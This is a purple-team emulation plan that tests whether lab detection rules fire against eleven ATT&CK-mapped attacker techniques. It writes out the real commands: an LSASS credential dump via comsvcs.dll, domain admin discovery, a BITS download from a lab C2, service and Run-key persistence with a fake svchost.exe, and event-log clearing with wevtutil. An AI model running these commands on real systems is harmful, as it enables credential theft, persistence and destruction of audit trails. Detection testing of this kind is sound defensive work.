# Emulation Plan — PROJ-2024-004 (Operation Desert Cipher)

**Classification:** TLP:AMBER  
**Date:** 2024-11-01  
**Execution sequence:** MOD-01 → MOD-02 → MOD-03 → MOD-04 → MOD-10 → MOD-05 → MOD-06 → MOD-07 → MOD-08 → MOD-09 → MOD-11

---

## MOD-01: Off-Hours VPN Logon from Non-Corporate ASN

| Field | Value |
|---|---|
| ATT&CK | T1133 (adapted from T1557 post-exploitation) |
| Detection under test | DET-001 (VPN ASN anomaly rule) |
| Execution account | test_contractor_01 |
| Target | TechPay-Lab VPN Gateway |
| Command | Authenticate to test VPN gateway from CyberShield-hosted VPS (non-corporate ASN); timestamp: 02:00 IST |
| Pass criterion | Alert fires within 5 min; captures: source IP, source ASN, user, timestamp |
| Failure definition | Alert does not fire = rule not deployed or rule logic broken |

---

## MOD-02: Discovery Commands

| Field | Value |
|---|---|
| ATT&CK | T1087.002 + T1016 + T1018 |
| Detection under test | NONE expected |
| Execution account | test_contractor_01 |
| Target | JUMPHOST-LAB |
| Commands | `net user /domain` → `net group "Domain Admins" /domain` → `ipconfig /all` → `nslookup target-lab.lab` |
| Pass criterion | *Intentionally testing for gap* — alert should NOT fire (no rule exists); document gap confirmed |
| Note | This module's expected result is FAIL (gap); pass = gap confirmed and documented |

---

## MOD-03: RDP Lateral Movement from DMZ to Operational Segment

| Field | Value |
|---|---|
| ATT&CK | T1021.001 |
| Detection under test | DET-LM-001 |
| Execution account | test_contractor_01 (with lab RDP access) |
| Target | JUMPHOST-LAB → TARGET-LAB |
| Command | `mstsc /v:target-lab.lab` from JUMPHOST-LAB |
| Pass criterion | Alert fires within 35 min (documented delay acknowledged); source: JUMPHOST-LAB (DMZ subnet); destination: TARGET-LAB (Ops subnet); logon type captured |
| PARTIAL criterion | Alert fires but missing logon type field or host field |

---

## MOD-04: LSASS Dump via comsvcs.dll

| Field | Value |
|---|---|
| ATT&CK | T1003.001 |
| Detection under test | DET-LSASS-001 |
| Execution account | SYSTEM (via scheduled task in lab) |
| Target | TARGET-LAB |
| Command | `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\Windows\Temp\test.dmp full` |
| Pass criterion | Alert fires within 5 min; GrantedAccess value captured; process ancestry captured |
| FP test | Simulate backup tool LSASS access separately; confirm rule correctly suppresses it |

---

## MOD-05: BITS Job to External Lab C2

| Field | Value |
|---|---|
| ATT&CK | T1197 |
| Detection under test | DET-BITS-001 |
| Execution account | test_contractor_01 (elevated in lab) |
| Target | TARGET-LAB |
| Command | `bitsadmin /transfer testjob /download /priority normal "https://[lab-c2]/test.bin" "C:\Windows\Temp\test.bin"` |
| Pass criterion | Alert fires within 10 min; captures BITS job name, destination domain, source host |
| Gap check | Run same command on hosts where rule is NOT deployed; confirm gap |

---

## MOD-06: Service Installation from Non-Standard Path

| Field | Value |
|---|---|
| ATT&CK | T1543.003 |
| Detection under test | DET-SVC-001 |
| Execution account | SYSTEM |
| Target | TARGET-LAB |
| Commands | `sc create TestSvcMonitor binpath= "C:\Windows\Temp\svchost.exe"` then `sc start TestSvcMonitor` |
| Pass criterion | Alert fires within 5 min; EID 7045 captured; service path flagged as non-standard |

---

## MOD-07: Registry Run Key Persistence (HKCU)

| Field | Value |
|---|---|
| ATT&CK | T1547.001 |
| Detection under test | DET-REG-001 (if deployed) |
| Execution account | test_contractor_01 |
| Target | TARGET-LAB |
| Command | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /t REG_SZ /d "C:\Windows\Temp\svchost.exe"` |
| Pass criterion | Alert fires within 5 min |
| Known issue | Sysmon registry monitoring may not cover HKCU; document gap if rule misses HKCU |

---

## MOD-08: Full-Table Database Query (Collection)

| Field | Value |
|---|---|
| ATT&CK | T1005 + T1074.001 |
| Detection under test | DET-DB-001 |
| Execution account | Lab service account (equivalent to SVC-HAVAYAIT-MAINT) |
| Target | DB-LAB |
| Command | Lab database tool; full-table SELECT on test table (no production data) |
| Pass criterion | Alert fires within 5 min; query content captured; executing account logged |

---

## MOD-09: HTTPS Exfiltration via BITS (Multi-Chunk, 100 MB)

| Field | Value |
|---|---|
| ATT&CK | T1041 + T1197 |
| Detection under test | Volume anomaly rule (if deployed) |
| Execution account | test_contractor_01 |
| Target | TARGET-LAB → CyberShield Lab C2 |
| Action | BITS-mediated HTTPS transfer of 100 MB test file in 5 chunks to lab C2 |
| Pass criterion | Volume threshold alert fires; total bytes to non-corporate destination captured |
| Gap documentation | If no volume rule exists, this module confirms critical gap (P1) |

---

## MOD-10: PowerShell Encoded Command Execution

| Field | Value |
|---|---|
| ATT&CK | T1059.001 |
| Detection under test | DET-PS-001 |
| Execution account | test_contractor_01 |
| Target | JUMPHOST-LAB |
| Command | `powershell.exe -EncodedCommand [base64 of "Write-Host 'emulation test'"]` |
| Pass criterion | Alert fires; decoded command visible in alert; encoding flag captured |

---

## MOD-11: wevtutil Log Clear (RUN LAST)

| Field | Value |
|---|---|
| ATT&CK | T1070.001 |
| Detection under test | DET-004 |
| Execution account | SYSTEM |
| Target | TARGET-LAB |
| Commands | `wevtutil cl Security` → `wevtutil cl System` → `wevtutil cl Application` |
| Pass criterion | Alert fires within 2 min; EID 1102 captured |
| **CRITICAL** | **Run this module LAST — it destroys lab evidence** |
